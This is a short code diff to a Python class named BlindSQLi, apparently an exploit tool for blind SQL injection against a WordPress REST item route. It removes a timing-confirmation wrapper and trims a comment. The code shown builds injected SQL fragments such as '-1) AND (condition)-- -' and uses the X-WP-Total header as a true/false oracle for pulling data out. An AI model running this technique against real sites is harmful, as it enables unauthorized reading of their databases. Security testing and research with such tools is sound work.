@@ -37,15 +37,6 @@ class BlindSQLi:
         self.sleep = sleep
         self.requests = 0
 
-    def confirm(self) -> Tuple[bool, float, float]:
-        """Confirm injectability with a differential time delay.
-
-        Returns ``(confirmed, baseline_seconds, delayed_seconds)``. This reads no database
-        content and modifies nothing.
-        """
-        result = self.confirm_timing(samples=1)
-        return result.confirmed, result.baseline, result.delayed
-
     def confirm_timing(self, *, samples: int = 3) -> TimingConfirmation:
         """Confirm injectability with paired timing samples.
 
@@ -120,9 +111,8 @@ class BlindSQLi:
         return self.client.inject(f"0) OR {sql}-- -").elapsed
 
     def _true(self, condition: str) -> bool:
-        # Read X-WP-Total (matched-row count), not the body: the item-route source sends no `page`,
-        # so the confused get_items() paginates to an empty body even when rows match. `NOT IN (-1)`
-        # matches every post, so a true condition counts all posts (>0) and a false one counts none.
+        # Read X-WP-Total, not the body: the item-route source sends no `page`, so get_items() can
+        # paginate to an empty body even when rows match. `NOT IN (-1)` matches every post.
         self.requests += 1
         count = self.client.match_count(self.client.inject(f"-1) AND ({condition})-- -"))
         if count is None:
